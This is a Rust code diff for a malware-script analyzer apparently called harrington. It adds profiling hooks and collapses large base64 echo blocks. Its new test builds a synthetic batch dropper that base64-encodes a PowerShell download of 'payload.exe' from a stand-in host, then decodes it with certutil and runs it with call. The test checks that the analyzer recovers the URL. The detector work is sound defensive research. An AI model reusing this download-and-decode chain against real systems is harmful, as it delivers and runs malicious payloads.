@@ -669,6 +669,54 @@ mod echo_tests {
     }
 
     #[test]
+    fn large_block_echo_blob_is_collapsed_but_decoded_child_is_analyzed() {
+        use base64::Engine;
+
+        let padding = "rem pad\r\n".repeat(40_000);
+        let inner = format!(
+            "@echo off\r\npowershell -c \"iwr https://large-block.example/payload.exe\"\r\n{padding}"
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(inner.as_bytes());
+        let mut script = String::from("@echo off\r\n(\r\n");
+        for chunk in b64.as_bytes().chunks(4096) {
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str("\r\n");
+        }
+        script.push_str(
+            ") > \"p.b64\"\r\ncertutil -decode \"p.b64\" \"p.bat\"\r\ncall \"p.bat\"\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report.deobfuscated.contains("harrington: omitted")
+                && report.deobfuscated.len() < script.len() / 4,
+            "large block should be summarized, deob={} script={}",
+            report.deobfuscated.len(),
+            script.len()
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::OutputCapped { .. })),
+            "collapsed blob should not trip output cap: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| match t {
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => {
+                    src.contains("large-block.example/payload.exe")
+                }
+                _ => false,
+            }),
+            "decoded child URL not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn block_echo_b64_polyglot_certutil_call_extracts_inner_url() {
         // The 8270 idiom: write a base64 bat/PS polyglot via a `(echo...) > f`
         // block, `certutil -decode` it, `call` it. The polyglot's PS half is
@@ -2682,6 +2730,23 @@ fn looks_like_utf16le(bytes: &[u8]) -> bool {
 /// structural signals + caps), and extracted child cmd/ps1 payloads
 /// (raw bytes plus a normalized form for the ps1 cases).
 pub fn analyze(input: &[u8], cfg: &Config) -> Report {
+    let profile_enabled = std::env::var_os("HARRINGTON_PROFILE").is_some();
+    let profile_start = std::time::Instant::now();
+    let mut profile_last = profile_start;
+    macro_rules! profile_mark {
+        ($stage:literal) => {
+            if profile_enabled {
+                let now = std::time::Instant::now();
+                eprintln!(
+                    "harrington_profile stage={} delta_ms={} total_ms={}",
+                    $stage,
+                    now.duration_since(profile_last).as_millis(),
+                    now.duration_since(profile_start).as_millis()
+                );
+                profile_last = now;
+            }
+        };
+    }
     let mut env = Environment::new(cfg);
     if cfg.self_extract {
         env.input_bytes = Some(std::sync::Arc::from(input));
@@ -2702,6 +2767,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
     }
     pre_scan_polyglot_script_block(input, &mut env);
     deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
+    profile_mark!("setup_and_prescan");
     if looks_like_pe(input) {
         env.traits.push(Trait::DisguisedBinary {
             format: "pe".to_string(),
@@ -2710,6 +2776,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         env.recovered_pe
             .push(("disguised-pe-input".to_string(), input.to_vec()));
         scan_binary_input_urls(input, &mut env);
+        profile_mark!("binary_input");
     } else if let Some(fmt) = detect_disguised_binary(input) {
         // Non-PE binary formats masquerading as `.bat`/`.cmd`/`.ps1`
         // (CAB / ZIP / RAR / 7z / LNK / PDF / image). Persist the bytes
@@ -2722,6 +2789,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         env.recovered_pe
             .push((format!("disguised-{fmt}-input"), input.to_vec()));
         scan_binary_input_urls(input, &mut env);
+        profile_mark!("binary_input");
     } else {
         if let Some(decoded) = decode_utf16le_script_blob(input) {
             pre_scan_utf16_script_blob(&decoded, &mut env);
@@ -2729,30 +2797,39 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         } else {
             drive(input, &mut env, &mut out);
         }
+        profile_mark!("drive");
         let raw_text = String::from_utf8_lossy(input);
         deob_scan::scan_embedded_powershell_invocations(&raw_text, &mut env);
         deob_scan::scan_embedded_powershell_invocations(&out, &mut env);
         env.all_extracted_ps1
             .extend(std::mem::take(&mut env.exec_ps1));
+        profile_mark!("embedded_ps");
         analyze_extracted_payloads(&mut env, &mut out, 1);
+        profile_mark!("extracted_payloads");
         if !env.check_deadline() {
             ps1_scan::extract_self_embedded_ps1(&mut env, &out);
         }
+        profile_mark!("self_embedded_ps1");
         if !env.check_deadline() {
             ps1_scan::scan_ps1_payloads(&mut env);
         }
+        profile_mark!("ps1_scan");
         if !env.check_deadline() {
             vbs_scan::scan_vbs_payloads(&mut env);
         }
+        profile_mark!("vbs_scan");
         if !env.check_deadline() {
             js_scan::scan_js_payloads(&mut env);
         }
+        profile_mark!("js_scan");
         if !env.check_deadline() {
             ps1_scan::scan_inline_powershell_text(&out, &mut env);
         }
+        profile_mark!("inline_ps");
         if !env.check_deadline() {
             deob_scan::scan_deob_text(&out, &mut env);
         }
+        profile_mark!("scan_deob_text");
         // The char-index-extractor scan needs the FULL source — our
         // normalize pipeline's marker-noise stripping can mangle the
         // PS body that hosts the `function Musculos…` definition
@@ -2762,6 +2839,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         if !env.check_deadline() {
             deob_scan::scan_ps_char_index_extractor_urls(&raw_text, &mut env);
         }
+        profile_mark!("raw_ps_char_index");
         // .js samples that wrap their HTA/JS payload in
         // `unescape('%XX%XX…')` (8 corpus samples, gov-cn.cloud
         // family) get the URLs hidden inside URL-encoded blobs. The
@@ -2771,6 +2849,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         if !env.check_deadline() {
             deob_scan::scan_js_unescape_urls(&raw_text, &mut env);
         }
+        profile_mark!("raw_js_unescape");
         if !env.check_deadline() {
             deob_scan::scan_inline_b64_urls(&out, &mut env);
         }
@@ -2801,15 +2880,19 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         if !env.check_deadline() {
             deob_scan::scan_decimal_ip_urls(&out, &mut env);
         }
+        profile_mark!("url_family_scans");
         if !env.check_deadline() {
             deob_scan::scan_multistage_encrypted_dropper(&out, &mut env);
         }
+        profile_mark!("multistage_dropper");
         if !env.check_deadline() {
             aes_chain::extract_from_chain(input, &out, &mut env);
         }
+        profile_mark!("aes_chain");
         if !env.check_deadline() {
             deob_scan::scan_unc_webdav(&out, &mut env);
         }
+        profile_mark!("unc_webdav");
     }
     // Also walk JS/VBS payloads for UNC C2 patterns — the deob text only
     // contains CMD code; an `objShell.Run('\\\\host@SSL\\DavWWWRoot\\...')`
@@ -2829,6 +2912,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         let text = String::from_utf8_lossy(body);
         deob_scan::scan_unc_webdav(&text, &mut env);
     }
+    profile_mark!("payload_unc_webdav");
     // Filter out Download traits whose `src` URL is noise (unresolved
     // `%%X` loop vars, `%foo%` undefined refs, bad IPs, well-known scrape
     // hosts). Several handlers (cmd.rs, curl.rs) push Trait::Download
@@ -2847,11 +2931,13 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         _ => true,
     });
     dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
+    profile_mark!("filter_and_dedup");
     let extracted_ps1_normalized: Vec<String> = env
         .all_extracted_ps1
         .iter()
         .map(|bytes| ps1_scan::normalize_ps1_payload(bytes))
         .collect();
+    profile_mark!("normalize_ps1_payloads");
     // Surface decoded/extracted PowerShell payloads in the deob with a
     // banner so analysts can read the reconstructed PS body — critical
     // for set-fragment-assembled `$ddsdfgo = '<b64>'; iex $x` chains
@@ -2946,6 +3032,8 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
     // Re-run dedup since the post-banner scan may have emitted dupes.
     let max_per_kind = cfg.max_traits_per_kind;
     dedup_traits(&mut env.traits, max_per_kind);
+    profile_mark!("final_scan_and_dedup");
+    let _ = profile_last;
     Report {
         deobfuscated: out,
         traits: std::mem::take(&mut env.traits),
@@ -3228,7 +3316,55 @@ fn looks_like_batch(content: &[u8]) -> bool {
 /// can resolve the file. Only blocks whose body is entirely `echo` lines are
 /// captured — any other command makes the combined output ambiguous, so we
 /// bail rather than guess.
-fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct CapturedEchoBlock {
+    open_idx: usize,
+    close_idx: usize,
+    target: String,
+    payload_bytes: usize,
+    collapsed: bool,
+}
+
+fn should_collapse_echo_block(payloads: &[String]) -> bool {
+    const MIN_COLLAPSE_BYTES: usize = 256 * 1024;
+
+    let total: usize = payloads.iter().map(|p| p.len()).sum();
+    if total < MIN_COLLAPSE_BYTES {
+        return false;
+    }
+
+    let mut base64ish = 0usize;
+    let mut checked = 0usize;
+    for b in payloads.iter().flat_map(|p| p.bytes()) {
+        if b.is_ascii_whitespace() {
+            continue;
+        }
+        checked += 1;
+        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_') {
+            base64ish += 1;
+        }
+    }
+    checked > 0 && base64ish * 100 / checked >= 95
+}
+
+fn block_echo_payload(line: &str) -> Option<&str> {
+    let bytes = line.as_bytes();
+    let head = bytes.get(..4)?;
+    if !head.eq_ignore_ascii_case(b"echo") {
+        return None;
+    }
+    let rest = &line[4..];
+    if rest.is_empty() {
+        return Some("");
+    }
+    match rest.as_bytes()[0] {
+        b' ' | b'\t' => Some(rest.trim_start_matches([' ', '\t'])),
+        b'.' | b':' => Some(&rest[1..]),
+        _ => None,
+    }
+}
+
+fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) -> Vec<CapturedEchoBlock> {
     // Pre-scan runs BEFORE the main interpreter, so env doesn't yet have
     // any `set _t=…` definitions from preceding lines. We need those so
     // the redirect target (`> "%_t%"`) can be var-expanded into the same
@@ -3238,6 +3374,7 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
     // double-apply or leak side effects like trait pushes).
     let mut scratch = env.clone();
     let mut i = 0usize;
+    let mut captured = Vec::new();
     while i < lines.len() {
         // Apply any leading SET lines so the redirect target expands.
         let stripped = lines[i].trim_start_matches(['@', ' ', '\t']);
@@ -3264,12 +3401,8 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
                 close_idx = Some(j);
                 break;
             }
-            // Recognize `echo X` / `echo.X` / `echo:X` / bare `echo`.
-            let lower = body.to_ascii_lowercase();
-            if lower == "echo" || lower.starts_with("echo ") {
-                payloads.push(body["echo".len()..].trim_start().to_string());
-            } else if lower.starts_with("echo.") || lower.starts_with("echo:") {
-                payloads.push(body["echo.".len()..].to_string());
+            if let Some(payload) = block_echo_payload(body) {
+                payloads.push(payload.to_string());
             } else {
                 body_is_all_echo = false;
                 break;
@@ -3316,12 +3449,16 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
         // (matching CMD's per-echo newline), with a trailing CRLF.
         let mut content = String::new();
         for p in &payloads {
-            let toks = lex::lex(p);
-            // Same scratch env as the target — keeps echo bodies that
-            // reference earlier SET vars (`echo %url% > file`) consistent
-            // with how the redirect target was resolved.
-            let expanded = normalize::normalize_to_string(&toks, &mut scratch);
-            content.push_str(&expanded);
+            if p.contains('%') || p.contains('!') {
+                let toks = lex::lex(p);
+                // Same scratch env as the target — keeps echo bodies that
+                // reference earlier SET vars (`echo %url% > file`) consistent
+                // with how the redirect target was resolved.
+                let expanded = normalize::normalize_to_string(&toks, &mut scratch);
+                content.push_str(&expanded);
+            } else {
+                content.push_str(p);
+            }
             content.push_str("\r\n");
         }
         let key = target.path().to_ascii_lowercase();
@@ -3337,8 +3474,16 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
                 content: bytes,
                 append: target.append(),
             });
+        captured.push(CapturedEchoBlock {
+            open_idx: i,
+            close_idx: close,
+            target: target.path().to_string(),
+            payload_bytes: payloads.iter().map(|p| p.len() + 2).sum(),
+            collapsed: should_collapse_echo_block(&payloads),
+        });
         i = close + 1;
     }
+    captured
 }
 
 fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u32) {
@@ -3546,7 +3691,13 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
     // never populated. Capturing it up front lets certutil -decode / call
     // resolve the written file. Safe to run before the main loop: the close
     // `)` redirect line is a block delimiter and never re-writes the file.
-    capture_block_echo_redirects(&lines, env);
+    let captured_echo_blocks = capture_block_echo_redirects(&lines, env);
+    let collapsed_echo_blocks: std::collections::HashMap<usize, CapturedEchoBlock> =
+        captured_echo_blocks
+            .into_iter()
+            .filter(|block| block.collapsed)
+            .map(|block| (block.open_idx, block))
+            .collect();
     // Save the caller's label_index and install one for this script frame.
     let prior_labels = std::mem::take(&mut env.label_index);
     env.label_index = labels::build_label_index(&lines);
@@ -3569,6 +3720,17 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
 
         env.current_line = Some(cursor);
         let logical = &lines[cursor];
+
+        if let Some(block) = collapsed_echo_blocks.get(&cursor) {
+            out.push_str("(\r\n");
+            out.push_str(&format!(
+                "::==== harrington: omitted {} bytes from redirected echo block -> {} ====\r\n",
+                block.payload_bytes, block.target
+            ));
+            out.push_str(&format!(") > {}\r\n", block.target));
+            cursor = block.close_idx + 1;
+            continue;
+        }
 
         // Label-only lines and `rem` comments aren't interpreted, but we
         // still echo `:label` lines to the deob output — analysts need
